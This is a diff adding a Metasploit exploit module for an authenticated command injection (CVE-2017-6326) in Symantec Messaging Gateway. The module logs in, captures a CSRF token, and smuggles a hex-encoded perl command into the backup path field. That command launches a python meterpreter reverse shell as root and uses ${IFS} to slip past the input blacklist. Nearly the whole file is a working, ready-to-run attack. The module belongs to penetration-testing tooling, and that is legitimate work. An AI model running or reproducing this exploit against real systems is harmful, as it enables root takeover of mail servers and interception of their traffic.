@@ -1,0 +1,202 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Symantec Messaging Gateway Remote Code Execution",
+      'Description'    => %q{
+        This module exploits the command injection vulnerability of Symantec Messaging Gateway product. An authenticated user can execute a
+        terminal command under the context of the web server user which is root.
+
+        backupNow.do endpoint takes several user inputs and then pass them to the internal service which is responsible for executing
+        operating system command. One of the user input is being passed to the service without proper validation. That cause an command
+        injection vulnerability. But given parameters, such a SSH ip address, port and credentials are validated before executing terminal
+        command. Thus, you need to configure your own SSH service and set the required parameter during module usage.
+
+        This module was tested against Symantec Messaging Gateway 10.6.2-7.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Mehmet Ince <mehmet@mehmetince.net>' # author & msf module
+        ],
+      'References'     =>
+        [
+          ['URL', 'https://pentest.blog/unexpected-journey-5-from-weak-password-to-rce-on-symantec-messaging-gateway/'],
+          ['CVE', '2017-6326']
+        ],
+      'DefaultOptions' =>
+        {
+          'SSL' => true,
+          'RPORT' => 443,
+          'Payload' => 'python/meterpreter/reverse_tcp'
+        },
+      'Platform'       => ['python'],
+      'Arch'           => ARCH_PYTHON,
+      'Targets'        => [[ 'Automatic', { }]],
+      'Privileged'     => true,
+      'DisclosureDate' => "Apr 26 2017",
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(443),
+        OptString.new('USERNAME', [true, 'The username to login as']),
+        OptString.new('PASSWORD', [true, 'The password to login with']),
+        OptString.new('SSH_ADDRESS', [true, 'The ip address of your SSH service']),
+        OptInt.new('SSH_PORT', [true, 'The port of your SSH service', 22]),
+        OptString.new('SSH_USERNAME', [true, 'The username of your SSH service']),
+        OptString.new('SSH_PASSWORD', [true, 'The password of your SSH service']),
+        OptString.new('TARGETURI', [true, 'The base path to Symantec Messaging Gateway', '/'])
+      ]
+    )
+  end
+
+  def username
+    datastore['USERNAME']
+  end
+
+  def password
+    datastore['PASSWORD']
+  end
+
+  def ssh_address
+    datastore['SSH_ADDRESS']
+  end
+
+  def ssh_port
+    datastore['SSH_PORT']
+  end
+
+  def ssh_username
+    datastore['SSH_USERNAME']
+  end
+
+  def ssh_password
+    datastore['SSH_PASSWORD']
+  end
+
+  def auth
+    print_status("Performing authentication...")
+
+    sid        = ''
+    last_login = ''
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'brightmail', 'viewLogin.do')
+    })
+
+    if res && !res.get_cookies.empty?
+      last_login = res.get_hidden_inputs.first['lastlogin'] || ''
+      sid = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || ''
+    else
+      fail_with(Failure::Unknown, "Didn't get cookie-set header from response.")
+    end
+
+    cookie = ''
+
+    # Performing authentication
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, 'brightmail', 'login.do'),
+      'headers'   => {
+        'Referer' => "https://#{peer}/brightmail/viewLogin.do",
+        'Connection' => 'keep-alive'
+      },
+      'cookie'    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}",
+      'vars_post' => {
+        'lastlogin'  => last_login,
+        'userLocale' => '',
+        'lang'       => 'en_US',
+        'username'   => username,
+        'password'   => password,
+        'loginBtn'   => 'Login'
+      }
+    })
+
+    if res &&res.body =~ /Logged in/
+      cookie = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0]
+      print_good("Awesome..! Authenticated with #{username}:#{password}")
+    else
+      fail_with(Failure::Unknown, 'Credentials are not valid.')
+    end
+
+    cookie
+  end
+
+  def get_csrf_token(cookie)
+
+    print_status('Capturing CSRF token')
+
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, 'brightmail', 'admin', 'backup', 'backupNow.do'),
+      'cookie'    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{cookie}",
+    })
+
+    csrf_token = nil
+    if res && res.code == 200
+      match = res.body.match(/type="hidden" name="symantec.brightmail.key.TOKEN" value="(\w+)"\/>/)
+      if match
+        csrf_token = match[1]
+        print_good("CSRF token is : #{csrf_token}")
+      else
+        fail_with(Failure::Unknown, 'There is no CSRF token at HTTP response.')
+      end
+    else
+      fail_with(Failure::Unknown, 'Something went wrong.')
+    end
+
+    csrf_token
+  end
+
+  def exploit
+
+    cookie = auth
+    csrf_token = get_csrf_token(cookie)
+
+    # I want to get meterpreter instead of cmd shell but SPACE and some other characters are blacklisted.
+    # Note that, we always have one SPACE at the beginning of python payload. e.g: import base64,sys;
+    # Here is the thing, use perl payload with ${IFS} technique and deliver the real payload inside of it :)
+    # So we gonna execute a perl payload on server side which will execute our meterpreter python payload.
+
+    cmd = "python -c \"#{payload.encoded}\""
+    final_payload = cmd.to_s.unpack("H*").first
+
+    p = "perl${IFS}-e${IFS}'system(pack(qq,H#{final_payload.length},,qq,#{final_payload},))'"
+
+    # Ok. We are ready to go
+    send_request_cgi({
+    'method'    => 'POST',
+    'uri'       => normalize_uri(target_uri.path, 'brightmail', 'admin', 'backup', 'performBackupNow.do'),
+    'cookie'    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{cookie}",
+    'vars_post' => {
+      'pageReuseFor'                        => 'backup_now',
+      'id'                                  => '',
+      'symantec.brightmail.key.TOKEN'       => csrf_token,
+      'backupData'                          => 'full',
+      'customType'                          => 'configuration',
+      'includeIncidentMessages'             => 'true',
+      'includeLogData'                      => 'true',
+      'backupTo'                            => '2',
+      'remoteBackupProtocol'                => 'SCP',
+      'remoteBackupAddress'                 => ssh_address,
+      'remoteBackupPort'                    => ssh_port,
+      'remoteBackupPath'                    => "tmp$(#{p})",
+      'requiresRemoteAuthentication'        => 'true',
+      'remoteBackupUsername'                => ssh_username,
+      'remoteBackupPassword'                => ssh_password,
+      }
+    })
+  end
+
+end
